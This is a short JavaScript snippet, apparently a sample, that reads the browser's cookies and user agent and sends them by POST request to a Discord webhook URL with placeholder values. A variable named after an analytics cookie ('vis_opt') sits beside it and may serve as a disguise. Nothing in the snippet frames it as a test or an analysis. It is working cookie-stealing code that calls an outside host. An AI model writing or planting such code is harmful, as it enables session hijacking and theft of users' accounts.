const marker = "vis_opt";
const reportEndpoint = "https://discord.com/api/webhooks/123456789012345678/example";
const cookies = document.cookie.split(";");
fetch(reportEndpoint, {method: "POST", body: JSON.stringify({cookie: document.cookie, userAgent: navigator.userAgent})});
